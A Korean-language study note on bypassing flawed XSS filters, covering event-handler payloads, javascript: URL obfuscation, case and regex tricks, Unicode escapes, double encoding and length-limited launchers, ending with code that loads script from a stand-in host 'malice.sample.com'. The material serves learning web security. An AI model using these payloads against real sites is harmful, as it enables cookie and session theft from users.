# XSS Filtering Bypass

> ## **XSS** (Cross-Site-Scripting)
> [클라이언트 사이드 취약점] 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하도록 하는 취약점
> * 다른 사용자의 정보를 추출하는 공격 기법
>   - 특정 계정의 세션 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있음
> * 이용자가 삽입한 내용을 출력하는 기능에서 XSS 공격이 발생함
> * 자세한 내용은 [Cross-Site-Scripting(XSS).md](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Web%20Hacking/Cross-Site-Scripting(XSS).md)를 참고

<br/>

* XSS 현황
    - XSS 공격이 증가함에 따라 이에 대한 방어책이 마련되고 있음
        + 많은 웹 개발자들이 XSS 공격에 대해 공부하고 이를 방어하는 코드를 작성함
        + XSS 공격을 막기 위한 다양한 오픈 소스 라이브러리들이 개발 중에 있음
    - 올바르지 않은 패치와 XSS 키워드 필터링으로 인해 끊임없이 이를 우회하고 다시 방어하는 방법들이 고안되어 왔음
* XSS 방어를 올바르지 않게 수행할 경우 발생할 수 있는 문제
    - 기존의 XSS 공격 방어 역할을 올바르게 수행하지 못함
    - **웹 방화벽이나 기타 방어 기법들을 우회해 새로운 공격을 수행할 수 있도록 기회를 제공함**

<br/><br/>

## XSS 필터링
### HTML에서 XSS 공격을 방어하기 위한 필터링이 복잡해지는 이유
* **이유1**: SGML을 바탕으로 하는 HTML
    - 사용자의 문서 작성 편의를 초점으로 둔 기능을 상당 수 유지함으로써 문법이 복잡해짐 → HTML을 해석하는 소프트웨어의 구조도 정교해짐
        + 문맥에 따른 태그 시작 및 끝 생략 기능, 자유로운 인용(quotation) 구문, 요소에 따른 내용 태그 해석 여부 변이 등이 사용자의 문서 작성 편의에 초점을 둔 기능들에 해당함
* **이유2**: Netscape 사와 Microsoft 사의 "브라우저 전쟁" 등을 거치면서 각 웹 브라우저가 해석할 수 있는 HTML에 별다른 규율 없이 태그 등을 늘려나감
    - 표준화가 제대로 정립되기 전까지 쌓여온 이 기능들이 현재에 들어서 잘 쓰이지 않거나 불편함을 야기함 → 많은 유산들로 인해 XSS 필터링을 포함한 HTML를 해석하는 소프트웨어 작성이 어려워졌음
        + 별다른 쳬계 없이 정립된 규칙 및 기능들을 IT 용어로 **유산**(legacy)이라고 함

<br/>

### XSS 필터링이 취해야 하는 방식
* 보안을 위해 XSS 필터링은 **보수적인 방식**(**Allowlist 필터링**)을 취해야 함
    - HTML에서 자바스크립트 코드를 실행하거나 페이지에 변형을 가하는 방법은 여러 가지가 있음 → **XSS 필터링은 이를 모두 막아 웹 페이지의 보안을 유지해야 함**
    - HTML 표준과 브라우저의 기능은 나날이 변화하고 발전하고 있으며, 안전하지 않은 코드를 실행할 수 있는 방법의 수가 계속 늘어나고 있음 → **안전하다고 알려진 마크업만 허용**하는 방식을 취해야 함
    - 일부 문자열만 바탕로 필터링할 경우 발생할 수 있는 문제점
        | 문제점 | 설명 |
        |---|------|
        | 허위양성(False Positive) | 어떤 조건이 실제로 성립되지 않았으나 성립되는 것으로 거짓 판별됨 |
        | 허위음성(False Negative) | 어떤 조건이 실제로 성립되었으나 성립되지 않은 것으로 거짓 판별됨 |
        + 허위양성 및 허위음성의 발생으로 필터링 자체가 제대로 이루어지지 못해 취약점이 발생할 수 있음

* **Allowlist VS Blocklist**
    | 용어 | 설명 |
    |---|------|
    | Allowlist | 지정된 장치 또는 서비스에 대한 접근이 허용된 사람 또는 항목의 목록 <br/> &nbsp;&nbsp; → Allowlist 필터링은 목록에 포함된 항목만 허용하는 방식 |
    | Blocklist | 지정된 장치 또는 서비스에 대한 접근이 차단된 사람 또는 항목의 목록 <br/> &nbsp;&nbsp; → Blocklist 필터링은 목록에 포함된 항목만 차단하는 방식 |
    - 기존에는 Whitelist와 Blacklist라는 용어를 사용했으나 현재는 Allowlist와 Blocklist로 대체되는 추세임
    - 출처: https://fractionalciso.com/allowlist-and-blocklist-are-better-terms-for-everyone-lets-use-them/


<br/>

### 자바스크립트 코드를 실행할 수 있는 **이벤트 핸들러 속성**
* 자바스크립트 코드를 실행할 수 있는 HTML 태그는 ```<script>``` 이외에도 상당수 존재함
    - **보통 태그의 속성 값으로 스크립트를 포함할 수 있는 경우**가 다수 존재함
        + 대표적인 예시: 이벤트 핸들러를 지정하는 ```on```으로 시작하는 속성들
* 이벤트 핸들러: 특정 요소에서 발생하는 이벤트를 처리하기 위해 존재하는 콜백(callback) 형태의 핸들러 함수
    - 이벤트 핸들러 내에 XSS 공격 코드를 삽입 → 해당 이벤트가 발생했을 때 삽입해둔 XSS 공격 코드가 실행됨
    - 태그의 속성 값으로 주로 들어가며, 그 종류 및 각 이벤트 발생 원리가 매우 다양함
        + 참고: [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/Events)
    - 자주 사용되는 이벤트 핸들러 속성
        | 이벤트 핸들러 속성 | 설명 |
        |---|------|
        | ```onload``` | 해당 태그가 요청하는 데이터를 로드한 후에 실행 <br/> &nbsp;&nbsp; - 로드에 실패 시 실행되지 않음 |
        | ```onerror``` | 해당 태그가 요청하는 데이터를 로드하는데 실패할 경우 실행 <br/> &nbsp;&nbsp; - 로드에 성공 시 실행되지 않음 |
        | ```onfocus``` | ```input``` 태그에 커서를 클릭하여 포커스가 되면 실행되는 이벤트 핸들러 <br/> &nbsp;&nbsp; - 1> 공격 상황에서 ```input``` 태그의 ```autofocus``` 속성을 이용해 자동으로 포커스시킴 <br/> &nbsp;&nbsp; - 2> URL의 hash 부분에 ```input``` 태그의 ```id``` 속성 값을 입력하여 자동으로 포커스되도록 함 |
        + 예시
            - ```onload``` 이벤트 핸들러 예시
                ```html
                <!-- img 태그로 유효한 이미지 로드 후 onload 핸들러가 실행됨 -->
                <img src="http://sample.com/valid.jpg" onload="alert(document.domain)">

                <!-- img 태그로 유효한 이미지 로드에 실패하므로 onload 핸들러를 실행하지 않음-->
                <img src="about:invalid" onload="alert(document.domain)">
                ```
            - ```onerror``` 이벤트 핸들러 예시
                ```html
                <!-- --img 태그로 유효한 이미지 로드에 성공하였으므로 onerror 핸들러를 실행하지 않음 -->
                <img src="valid.jpg" onerror="alert(document.domain)">

                <!-- img 태그로 유효한 이미지 로드에 실패하였으므로 onerror 핸들러가 실행됨 -->
                <img src="about:invalid" onerror="alert(document.domain)">
                ```
            - ```onfocus``` 이벤트 핸들러 예시
                ```html
                <!-- autofocus 속성으로 인해 페이지가 로드된 후 바로 input 태그에 포커스함 → 포커스된 직후 onfocus 핸들러가 실행됨 -->
                <input type="text" id="inputID" onfocus="alert(document.domain)" autofocus>
                <!-- URL의 hash 부분에 input 태그의 id 속성값을 입력할 경우 http://sample.com/#inputID 형식으로 입력함 -->
                ```

<br/><br/>

## 잘못된 방식의 XSS 필터링
### ⚠️ **WARNING**: 아래에 소개하는 필터링은 모두 **잘못된 방식의 필터링**이므로 실제로 사용하지 않기를 권장함
* XSS 취약점을 근본적으로 제거하기 위해서는 태그 삽입이 되지 않도록 처음부터 원인을 제거하는 것이 중요함

<br/>

### 잘못된 방식의 XSS 필터링 1: 문자열 치환
* 단순히 치환 혹은 제거하는 방식의 필터링을 사용할 경우 필터링되는 키워드 사이에 새로운 필터링 키워드를 삽입하는 방식으로 우회하는 것이 가능함
    - 중간에 삽입된 키워드가 제거되면서 다시 원본 키워드를 만들어내는 방식으로 우회할 수 있음
        + 예시: ```script``` 키워드 필터링 시 ```scrscriptipt```와 같이 제거되는 키워드를 중간에 삽입
    - 필터링 자체가 무력화될 뿐더러 웹 응용 방화벽(Web Application Firewall)에서 아래와 같은 공격 페이로드를 탐지하지 못하는 등의 부작용이 발생하게 됨
        ```javascript
        (x => x.replace(/onerror/g, ''))('<img oneonerrorrror=promonerrorpt(1)>')
        // 결과: <img onerror=prompt(1)>
        ```
* 대안: 문자열에 변화가 없을 때까지 지속적으로 치환하는 방식을 사용함
    ```javascript
    function replaceIterate(text) {
        while (true) {
            var newText = text.replace(/script|onerror/gi, '');
            if (newText === text) {
                break;
            }
            text = newText;
        }
        return text;
    }
    ```
    - 특정 키워드가 최종 마크업에 등장하지 않도록 하는데에는 효과적일 수 있음
    - 미처 고려하지 못한 구문의 존재, WAF 방어 무력화 등의 문제점은 기존 문자열 치환 방식과 동일함

<br/>

### 잘못된 방식의 XSS 필터링 2: 활성 하이퍼링크
* HTML 마크업에서 사용될 수 있는 URL들은 활성 콘텐츠를 포함할 수 있음
    - ```javascript:``` 스키카: URL 로그 시 자바스크립트 코드를 실행할 수 있도록 함
        + URL을 속성 값으로 받는 ```<a>``` 태그나 ```<iframe>``` 태그 등에 사용할 수 있음
        + 이러한 이유로 ```javascript:``` 스키마를 사용하지 못하도록 필터링 하는 경우가 존재함
* ```javascript:``` 필터링 우회 방안
    - 정규화(Normalization)
        + 브라우저들이 URL를 사용할 때 거치는 과정 중 하나
            - 동일한 리소스를 나타내는 서로 다른 URL들이 통일된 형태로 변환하는 과정
            - ```\x01```, ```\0x04```, ```\t```와 같은 특수 문자들이 제거되고, 스키마의 대소문자가 통일됨
        + 정규화를 이용한 우회 예시 (특수 문자 포함)
            ```html
            <a href="\1\4jAVasC\triPT:alert(document.domain)">Click me!</a>
            <!-- 정규화 결과: <a href="javascript:alert(document.domain)">Click me!</a> -->

            <iframe src="\1\4jAVasC\triPT:alert(document.domain)">
            <!-- 정규화 결과: <iframe src="javascript:alert(document.domain)" -->
            ```
    - HTML Entity Encoding
        + HTML 태그의 속성 내에서 사용 가능함
            - Entity Code: HTML 문서에서 특수 문자를 입력하기 위해 사용하는 코드
                + 특수 문자는 엔티티 코드로 작성하는 것이 좋음
        + HTML Entity Encoding을 이용한 필터링 우회 예시
            ```html
            <a href="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">Click me!</a>
            <!-- <a href="javascript:alert(document.domain);">Click me!</a>와 동일 -->

            <iframe src="\1&#4;J&#97;v&#x61;sCr\tip&tab;&colon;alert(document.domain);">
            <!-- <iframe src="javascript:alert(document.domain);">와 동일 -->
            ```
            - ```javascript:``` 스키마나 이 외의 XSS 키워드를 인코딩하여 필터링을 우회할 수 있음
* 자바스크립트의 ```URL``` 객체
    - 📚 [URL](https://developer.mozilla.org/en-US/docs/Web/API/URL) Docs
        + URL 인터페이스는 URL의 구문을 분석﹒구성﹒정규화 및 인코딩하는 데 사용함
        + 📚 [URL: URL() constructor](https://developer.mozilla.org/en-US/docs/Web/API/URL/URL) Docs
            - ```URL()``` 생성자: 매개변수로 정의된 URL을 나타내는 새로 생성된 ```URL``` 객체를 반환함
                ```javascript
                new URL(url) // url: 절대/상대 URL (상대 URL일 경우에 base를 필요로 함)
                new URL(url, base) // base: (optional) 상대 URL일 경우 사용할 기본 URL을 나타내는 문자열
                ```
                + 유효한 URL이 아닐 경우 Javascript TypeError 예외가 발생함
    - **URL을 직접 정규화**하고, ```protocol```, ```hostname``` 등 URL의 각종 정보를 추출할 수 있음
        +  이를 이용해 XSS 필터링 우회 공격 구문 작성 시 직접 URL을 정규화해보며 테스트하는 것이 가능함
            ```javascript
            function normalization(url) {
                return new URL(url, document.baseURI);
            }

            normalization('\4\4jAva\tScRIpT:alert(1)') // "javascript:alert"
            normalization('\4\4jAva\tScRIpT:alert(1)').protocol // "javascript:"
            normalization('\4\4jAva\tScRIpT:alert(1)').pathname // "alert(1)"
            ```

<br/>

### 잘못된 방식의 XSS 필터링 3: 태그와 속성 기반 필터링
* 단순히 태그나 속성을 바탕으로 필터링을 하게 되면 우회가 가능한 경우가 많음
* 취약한 필터링의 예시
    - 대문자 혹은 소문자만을 인식하는 필터링 우회
        + HTML은 문법 상 태그와 속성에서 **대소문자를 구분하지 않음** → 특정 키워드의 대소문자를 모두 검사하지 않을 경우 검사하지 않은 케이스만을 사용하거나 대소문자를 혼용하여 이를 우회할 수 있음
        + 예시
            - 대소문자를 모두 검사하지 않는 방식의 필터링
                ```javascript
                x => !x.includes('script') && !x.include('on') // script, on 문자열만 필터링하고 있음
                ```
            - 대소문자 검사가 미흡한 경우의 우회 방법
                ```html
                <!-- script 키워드를 대소문자를 혼용하여 나타냄 → script 문자열 필터링 우회 -->
                <sCRipT>alert(document.cookie)</scrIPT>

                <!-- on 키워드를 대문자로 나타냄 → on 문자열 필터링 우회 -->
                <img src="x:" ONeRroR="alert(document.cookie)"/> 
                ```
    - 잘못된 정규표현식을 사용한 필터 우회
        + 일반적으로 키워드를 필터링할 때에는 정규표현식(Regex Expression)을 이용함 → **정규표현식 필터링 자체에 문제가 있는 경우** 정규표햔식을 만족하면서 XSS 공격 구문을 삽입하는 것이 가능함
        + 예시
            - 스크립트 태그 내에 데이터가 존재하는지 검사하는 정규표현식을 이용한 필터링
                ```javascript
                x => !<script[^>]*>[^<]/i.text(x) // <script> 태그 내에 데이터가 존재하는지 검사
                ```
                + 우회 방법: ```<script>``` 태그의 ```src``` 속성 이용
                    ```html
                    <!-- 태그 내 데이터를 입력하지 않고 src 속성 내에 data: 스키마 을 이용해 데이터를 입력함 -->
                    <script src="data: ,alert(document.cookie)"></script>
                    ```
            - ```img``` 태그에 ```on``` 이벤트 핸들러가 존재하는지 검사하는 정규표현식을 이용한 필터링
                ```javascript
                x => !/<img.*on/i.test(x) // <img> 태그 내에 on 이벤트 핸들러의 존재 유무룰 검사
                ```
                + 우회 방법: 줄바꿈 문자를 이용 (멀티 라인에 대한 검사 미흡)
                    ```html
                    <!-- src="" 다음에 \n을 입력하여 줄을 바꿈으로써 필터링을 우회할 수 있음 -->
                    <img src=""\nonerror="alert(document.cookie)"/>
                    ```
    - 특정 태그 및 속성에 대한 필터링을 다른 태그 및 속성을 이용하여 필터 우회
        + HTML 내에는 굉장히 다양한 종류의 태그와 속성이 존재함 → XSS 공격을 할 때 보편적으로 사용하는 ```<script>```, ```<img>```, ```<input>``` 등의 태그를 필터링한다고 해서 모든 XSS 공격을 막을 수 있는 것은 아님
        + 예시
            - ```<script>```, ```<img>```, ```<input>``` 태그를 사용하지 못하도록 필터링
                ```javascript
                x => !/<script|<img|<input/i.test(x) // <script, <img, <input 문자열이 존재하는지 검사
                ```
                + 우회 방법: 다른 태그(```<source>```, ```<body>```)를 사용해 공격을 시도
                    ```html
                    <!-- <source> 태그의 onerror 이벤트 핸들러를 사용함 -->
                    <video>
                        <source onerror="alert(document.domain)"/>
                    </video>

                    <!-- <body> 태그의 onload 이벤트 핸들러을 사용함 -->
                    <body onload="alert(document.domain)"/>
                    ```
            - 위의 예시에 ```on``` 이벤트 핸들러 및 멀티 라인 문자를 검사하는 필터링을 추가
                ```javascript
                x => !/<script|<img|<input|<.*on/i.test(x) // on 이벤트 핸들러 및 멀티 라인 문자 검사
                ```
                - 우회 방법: 새로운 inner frame을 생성하는 ```<iframe>``` 태그를 이용하여 우회
                    ```html
                    <iframe src="javascript:alert(parent.document.domain)">
                    <iframe srcdoc="<&#x69;mg src=1 &#x6f;nerror=alert(parent.document.domain)>">
                    ```
                    + 공격에 사용한 ```<ifrmae>``` 태그의 속성 (📚 [```<iframe>``` docs](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) 참고)
                        | 속성 | 설명 |
                        |---|------|
                        | ```src``` | 포함될 페이지의 URL를 인자로 받음 <br/> &nbsp;&nbsp; - 활성 하이퍼링크를 이용해 자바스크립트 코드를 삽입하는 것이 가능함 (```javascript:``` 스키마 사용 가능) |
                        | ```srcdoc``` | 삽입할 인라인 HTML로 src 속성을 재정의함(= inline HTML code를 인자로 받음) <br/> &nbsp;&nbsp; - inner frame 내에 새로운 공격 코드를 입력하는 것이 가능함 <br/> &nbsp;&nbsp;&nbsp;&nbsp; - HTML 속성 내로 삽입됨 → HTML Entity Encoding으로 기존 필터링 우회 가능 |

<br/>

### 잘못된 방식의 XSS 필터링 4: 자바스크립트 함수 및 키워드 필터링
* 자바스크립트는 **Unicode escape sequence**와 **Computed member access**를 지원함 → 이를 통해 필터링을 우회할 수 있음
    - Unicode escape sequence: 문자열에서 유니코드 문자를 코드포인트로 나타낼 수 있느 표기법
        + EX: ```"\uAC00" == "가"```
        + Unicode escape sequence를 이용한 특정 키워드 필터링 우회 방법
            - 필터링된 키워드의 일부 문자를 코드포인트로 변경하여 표기함으로써 우회할 수 있음
                ```javascript
                var foo = "\u0063ookie"; // cookie (소문자 c를 코드포인트 \u0063으로 나타냄)
                var bar = "cooki\x65"; // cookie (소문자 e를 코드포인트 \x65로 나타냄)
                \u0061lert(document.cookie); // alert(document.cookie); (소문자 a를 코드포인트 \u0061로 나타냄)
                ```
    - Computed member access: 객체의 특정 속성에 접근할 때 속성 이름을 동적으로 계산하는 기능
        + EX: ```document["coo"+"kie"] == document["cookie"] == document.cookie```
            - 세 표현 모두 동일하게 DOM에 저장된 쿠키 문자열인 ```document.cookie``` 속성을 의미함
        + Computed member access를 이용한 특정 키워드 필터링 우회 방법
            - 필터링된 속성 값을 문자열을 이용해 접근하고 문자열을 자르거나 변형하는 등의 우회가 가능함
                ```javascript
                // document["cook"+"ie"] == document.cookie
                alert(document["\u0063ook" + "ie"]); // alert(document.cookie); (Unicode escape sequence: 소문자 c를 코드포인트 \u0063으로 나타냄)

                // window['alert'](document["cook"+"ie"]) == window.alert(document.cookie)
                window['al\x65rt'](document["\u0063ook"+"ie"]); // alert(document.cookie); (Unicode escape sequence: 소문자 e를 코드포인트 \x65로, 소문자 c를 코드포인트 \u0063으로 나타냄)
                ```

* XSS 공격 구문의 자바스크립트 키워드를 필터링한 경우에는 우회할 수 있는 방법이 굉장히 다양함
    - XSS 공격에 흔히 사용되는 구문과 필터링 우회를 위해 사용될 수 있는 대체 예시
        | 구문 | 대체 구문 |
        |----|-----|
        | ```alert```, ```XMLHttpRequest``` 등 <br/>문서 최상위 객체 | ```window['al'+'ert']```, ```window['XMLHtt`+`pRequest`]``` 등 이름 끊어서 쓰기 |
        | ```window``` | ```self```, ```this``` |
        | ```eval(code)``` | ```Function(code)()``` |
        | ```Function``` | ```isNaN['constr'+'uctor']``` 등 함수의 ```constructor``` 속성 접근 |
    - 자바스크립트의 언어적 특성을 활용하면 6개의 문자(```[```, ```]```, ```(```, ```)```, ```!```, ```+```)만으로 모든 동작을 수행할 수 있음
        + 장점과 단점
            | 장점 | 단점 |
            |---|---|
            | ```cookie```와 같이 기존 XSS 필터링에서 주로<br/> 탐지하는 단어들을 언급하지 않아도 됨 <br/> &nbsp;&nbsp; → 상당수의 웹 사이트를 공격하는 데 활용됨 | XSS 공격 구문의 길이가 늘어남 |

* 필터링 혹은 인코딩/디코딩 등의 이유로 특정 문자(```()```, ```[]```, ```"```, ```'``` 등)를 사용하지 못하는 경우 대체할 수 있는 방법들을 통해 우회하여 공격할 수 있음
    - **문자열 선언**: 문자열을 사용할 때 필요한 따옴표(```"```, ```'```)가 필터링되어 있는 경우
        + [우회 방법 1] 탬플릿 리터럴(Template Literals)를 사용하는 방법
            - **탬플릿 리터럴**: 내장된 표현식을 허용하는 문자열 리터럴 → 여러 줄로 이뤄진 문자열과 문자를 보관하기 위한 기능으로 이용함
                + 백틱(`)을 이용해 선언할 수 있고, 내장된 ```${}``` 표현식을 이용해 다른 변수나 식을 사용할 수 있음
                    ```javascript
                    var foo = "Hello";
                    var bar = "World";

                    var baz = `${foo},
                    ${bar} ${1+1}.`; // baz = "Hello,\nWorld 2."
                    ```
        + [우회 방법 2] RegExp 객체를 사용하는 방법
            - ```/문자열/``` 형태로 RegExp 객체를 생성하고 객체의 패턴 부분(```/문자열/.source```)를 가져옴으로써 문자열을 만들 수 있음
                ```javascript
                var foo = /Hello World!/.source; // foo = "Hello World!"
                var bar = /test !/ + []; // bar = "/test !/"
                ```
        + [우회 방법 3] ```String.fromCharCode``` 함수를 사용하는 방법
            - ```String.fromCharCode``` 함수(📚 [String.fromCharCode() docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode) 참고)
                ```javascript
                String.fromCharCode(num1, num2, /* ..., */ numN)
                ```
                + 지정된 UTF-16 코드 단위 시퀀스(유니코드의 범위 중 파라미터로 전달된 일련의 숫자들)에서 생성된 문자열을 반환함
            - ```String.fromCharCode``` 함수를 이용한 문자열 생성 예시
                ```javascript
                var foo = String.fromCharCode(72, 101, 108, 108, 111); // foo = "Hello"
                ```
        + [우회 방법 4] 기본 내장 함수나 객체의 문자를 사용하는 방법
            - 내장 함수나 객체를 ```toString``` 함수를 이용해 문자열로 변경하게 되면 함수나 객체의 형태가 문자열로 변환됨 → 이를 이용해 원하는 문자열을 만드는데 필요한 문자들을 내장 함수/객체로부터 한 글자씩 가져와 문자열을 만들 수 있음
                ```javascript
                var baz = history.toString()[8] + // history.toString()[8] → "[object History]" 문자열의 인덱스 8에 위치한 문자인 "H"를 가져옴
                (history+[])[9] + // (history+[])[9] → "[object History]" 문자열의 인덱스 9에 위치한 문자인 "i"를 가져옴
                (URL+0)[12] + // (URL+0)[12] → "function URL() { [native code] }" 문자열의 인덱스 12에 위치한 문자인 "("를 가져옴
                (URL+0)[13];  // (URL+0)[13] → "function URL() { [native code] }" 문자열의 인덱스 13에 위치한 문자인 ")"를 가져옴
                // ⇒ var baz = "Hi()";와 동일
                ```
                + [📚 ```Object.prototype.toString()``` docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString), [📚 ```Function.prototype.toString()``` docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/toString) 참고
                    | 함수 | 설명 |
                    |---|------|
                    | ```Object.prototype.toString()``` | 객체를 나타내는 문자열을 반환하는 함수 (형식: ```객체명.toString()```)
                    | ```Function.prototype.toString()``` | 지정된 함수의 소스 코드를 나타내는 문자열을 반환하는 함수 (형식: ```함수명.toString()```) |
                + 함수나 객체와 ```+```, ```-```와 같은 산술 연산을 수행하게 되면 연산을 위해 객체 내부적으로 ```toString``` 함수를 호출해 문자열로 변환한 후에 연산을 수행함
                    - ```history.toString()```과 ```history+[]```는 동일하게 ```"[objecct History]``` 문자열을 반환함
                    - ```URL.toString()```과 ```URL+0```은 동일하게 ```function URL() { [native code] }``` 문자열을 반환함
        + [우회 방법 5] 숫자 객체의 진법 변환을 사용하는 방법
            - E4X 연산자(```..```)와 ```toString()``` 함수를 이용하여 10진수 숫자를 36진수로 변경하여 아스키 영어 소문자 범위를 모두 생성할 수 있음
                + [📚 ```Number.prototype.toString()``` docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number/toString) 참고
                    ```javascript
                    toString() // radix의 기본값인 10을 사용함
                    toString(radix) // radix: 숫자 값을 나타내는 데 사용할 기준을 지정하는 2에서 36 범위의 정수 (default: 10)
                    ```
                    - 지정된 숫자값을 나타내는 문자열을 반환함
                + E4X 연산자의 경우 주로 점 두 개(```.```)를 쓰거나, 소수점으로 인식되지 않도록 공백과 점을 조합해 사용(``` .```)할 수 있음
            - 진수 변환을 이용해 문자열을 생성하는 예시
                ```javascript
                var foo = 29234652..toString(36); // foo = "Hello"
                var bar = 29234652 .toString(36); // bar = "hello"
                ```
    - **함수 호출**: 자바스크립트의 함수를 호출하기 위한 소괄호(Parentheses, ```()```)와 Tagged Templates(백틱, `) 문자가 모두 필터링되어 있는 경우
        + [우회 방법 1] ```javascript:``` 스미카를 이용해 현재 ```location``` 객체를 변조하는 방법
            - ```javascript:``` 스키마를 이용하면 URL을 이용해 자바스크립트 코드를 실행시킬 수 있음 → 이 점을 이용하여 ```location``` 객체에 ```javascript:``` 스키마를 이용하여 자바스크립트 코드를 실행시킬 수 있음
                ```javascript
                // Unicode escape sequence: 문자 (를 \x28(\u0028, \050)로, 문자 )를 \x29(\u0029, \051)로 나타냄
                location="javascript:alert\x28document.domain\x29;";
                location.href="javascript:alert\u0028document.domain\u0029;";
                location['href']="javascript:alert\050document.domain\051;";
                ```
        + [우회 방법 2] ```Symbol.hasInstance```을 이용한 ```instanceof``` 연산자 오버라이딩을 통해 함수를 호출하는 방법
            + 문자열 이외에도 ECMAScript 6에서 추가된 Symbol 또한 속성 명칭으로 사용할 수 있음
            + ```instanceof``` 연산자를 사용할 때 ```Symbol.hasInstance``` well-known symbol에 함수가 존재할 경우 이를 인스턴스 체크 대신 호출하여 ```instanceof``` 연산자의 결과 값으로 사용할 수 있음
                ```javascript
                "alert\x28document.domain\x29" instanceof{[Symbol.hasInstance]:eval};
                Array.prototpye[Symbol.hasInstance]=eval;"alert\x28document.domain\x29" instanceof[];
                ```
            + 참고: [📚 ```Symbol.hasinstance``` docs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/hasInstance)
        + [우회 방법 3] ```document.body.innerHTML```에 코드를 추가하여 자바스크립트 코드를 실행하는 방법
            + 자바스크립트에서 ```document.body.innerHTML```에 코드를 추가하여 문서 내에 새로운 HTML 코드를 추가하는 것이 가능함 → 이를 이용해 자바스크립트 코드를 실행할 수 있음
                ```javascript
                // <img> 태그를 추가함 (onerror 이벤트 핸들러를 이용해 자바스크립트 코드를 실행시키고 있음)
                document.body.innerHTML += "<img src=x: onerror=alert&#40;1&#41;>";

                // <body> 태그를 추가함 (onload 이벤트 핸들러를 이용해 자바스크립트 코드를 실행시키고 있음)
                document.body.innerHTML += "<body src-=x: onload=alert&#40;1&#41;>";
                ```
            + ⚠️ **주의**: ```innerHTML```로 코드를 삽입할 때 보안 상의 이유로 ```<script>``` 태그는 실행되지 않음 → **이벤트 핸들러 속성을 이용해 자바스크립트 코드를 실행해야 함**


<br/>

### 잘못된 방식의 XSS 필터링 5: 디코딩 전 필터링
* 📌 **입력 검증은 디코딩 등의 모든 전처리 작업을 마치고 수행해야 함** *(= 검증이 끝난 데이터를 디코딩하여 사용해서는 안 됨)*
    - 애플리케이션이 웹 방화벽이 검증한 데이터를 받아 작업을 수행할 때 전달받은 데이터를 다시 디코딩해서 사용할 경우 공격자가 **더블 인코딩(Double Encoding)**으로 웹 방화벽의 검증을 쉽게 우회할 수 있음
        + 예사: 공격자(Attacker)가 게시글에 공격 코드 ```<script>...```를 포함해서 게시판에 올리고, 희생자(Victim)가 해당 글을 읽는 시나리오
            1. 공격자가 더블 URL 인코딩한 공격 코드 ```%253Cscript%2532...```를 포함하여 게시글 업로드를 요청함
            2. 웹 방화벽이 해당 데이터를 디코딩 후 검증함
                - 디코딩한 결과: ```%3Cscript%3E...``` → 안전하다고 판단해 차단하지 않고 애플리케이션에 전달함
            3. [**검증 후 디코딩 발생 시점**] 애플리케이션이 해당 데이터를 다시 디코딩하여 ```<script>...```를 게시판 DB에 저장함
            4. 희생자가 해당 게시글을 조회하면 XSS가 발생 → 악성 자바스크립트 코드가 실행됨
    - 웹 방화벽은 물론 애플리케이션 내부의 검증 로직 이후에도 디코딩해서는 안 됨
        + 예시: php 애플리케이션 코드에 더블 디코딩(Double Decoding) 취약점이 존재하여 더블 URL 인코딩으로 검증을 우회함
            ```php
            <?php
                $query = $_GET["query"];
                if (stripos($query, "<script>") != FALSE) { // stripos(): 대상 문자열을 앞에서부터 검색해 찾고자 하는 문자열이 몇 번째 위치에 있는지 반환함
                    header("HTTP/1.1 403 Forbidden");
                    die("XSS attempt detected: " . htmlspeicalchars($query, ENT_QUOTES|ENT_HTML5, "UTF-8")); # htmlspecialchars(): 특수 문자를 엔티티로 변환
                }
                // ...
                $searchQuery = urlencoded($_GET["query"]);
            ?>
            <h1>Search results for: <?php echo $searchQuery; ?></h1>
            ```

* 더블 인코딩(Double Encoding)과 더블 디코딩(Double Decoding)
    - 📚 [더블 인코딩(Double Encoding)](https://owasp.org/www-community/Double_Encoding)
        + 보안 제어를 우회하거나 응용 프로그램에서 예기치 않은 동작을 유발하기 위해 사용자 요청 매개 변수를 16진수 형식(hexadecimal format)으로 **두 번 인코딩**하는 것
        + 사용자 입력을 한 번 디코딩(Decoding)하는 보안 필터링을 우회할 수 있음
            - 두 번째 디코딩 과정은 애플리케이션 내에서 인코딩된 데이터를 적절하게 처리하지만, **보안 검사가 없기** 때문에 해당 데이터가 백엔드 플랫폼 또는 모듈에 그대로 넘겨지게 됨
            - 공격자는 웹 애플리케이션에서 사용 중인 인증 스키마(authentication schema) 및 보안 필터(security filters)를 우회하기 위해 경로 이름 또는 쿼리 문자열에 더블 인코딩을 삽입할 수 있음
    - 📚 [더블 디코딩(Double Decoding)](https://cwe.mitre.org/data/definitions/174.html) *- CWE-174 참고*
        + 동일한 입력을 두 번 디코딩(decoding)하여 디코딩 작업 사이에 발생하는 보호 메커니즘의 효율성을 제한하는 것

<br/>

### 잘못된 방식의 XSS 필터링 6: 길이 제한
* 삽입할 수 있는 코드의 길이가 제한되어 있는 경우 다른 경로로 실행할 추가적인 코드(payload)를 URL Fragment 등으로 삽입 후 삽입 지점에는 **본 코드를 실행하는 짧은 코드**(launcher)를 사용할 수 있음
    - [우회 방법 1] ```location.hash```를 이용한 공격 방법
        - Fragment로 스크립트를 넘겨준 후 XSS 지점에서 ```location.hash```로 URL의 Fragment 부분을 추출하여 ```eval()```로 실행함
            ```
            https://exapmple.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie);
            ```
    - [우회 방법 2] ```import```와 같은 외부 자원을 스크립트로 로드하여 공격하는 방법
        ```javascript
        // [1] import() 메서드를 통해 외부 자원을 스크립트로 로드함
        import("http://malice.sample.com");

        // [2] HTML 요소를 생성한 후 이를 추가하여 실행함
        var e = document.createElemet('script'); // document.createElement() 메서드를 통해 tagName('script')로 지정된 HTML 요소를 반환함
        e.src = 'http://malice.sample.com'; // src 속성에 로드할 외부 자원의 주소를 입력함
        document.appendChild(e); // appendChild() 메소드를 통해 HTML 요소를 document의 끝에 추가함

